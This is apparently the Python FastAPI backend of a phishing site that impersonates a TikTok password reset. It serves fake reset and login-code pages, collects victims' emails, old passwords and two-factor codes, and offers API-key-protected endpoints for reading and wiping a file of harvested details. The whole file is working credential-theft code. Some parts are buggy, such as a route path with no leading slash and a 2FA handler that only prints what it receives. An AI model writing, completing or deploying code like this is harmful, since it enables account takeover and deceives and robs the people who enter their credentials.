import os
import json

from fastapi import FastAPI, Form, Header, HTTPException, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from urllib.parse import urlencode
from dotenv import load_dotenv


load_dotenv()

app = FastAPI()


@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="https://www.tiktok.com/")


@app.get("/reset-password", response_class=HTMLResponse)
async def reset_password():
    with open("index.html", "r") as f:
        return f.read()


@app.get("/reset-failed", response_class=HTMLResponse)
async def reset_failed():
    with open("reset-failed.html", "r") as f:
        return f.read()


@app.post("/submit-form")
async def submit_form(email: str = Form(...), old_password: str = Form(...)):
    query_params = urlencode({"email": email, "old-password": old_password})
    return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)


@app.get("/login-code", response_class=HTMLResponse)
async def login_code(request: Request):
    email = request.query_params.get("email", "")
    old_password = request.query_params.get("old-password", "")
    with open("login-code.html", "r") as f:
        page = f.read()

    page = page.replace("{user-email}", email)
    page = page.replace("{old-password}", old_password)
    return page


@app.post("submit-2fa")
async def login(code: int = Form(...), email: str = Form(...), old_password: str = Form(...)):
    print(code, email, old_password)


@app.get("/read")
async def read_details(x_api_key: str = Header(...)):
    if x_api_key != os.getenv("MY_API_KEY"):
        raise HTTPException(
            status_code=401,
            detail=f"Unauthorized: Invalid API Key.",
        )

    with open("details.json", "r") as f:
        return json.load(f)


@app.get("/clear-json")
async def read_details(x_api_key: str = Header(...)):
    if x_api_key != os.getenv("MY_API_KEY"):
        raise HTTPException(
            status_code=401,
            detail=f"Unauthorized: Invalid API Key.",
        )

    with open("details.json", "w") as f:
        f.write("[]")

    return {"status": 200}
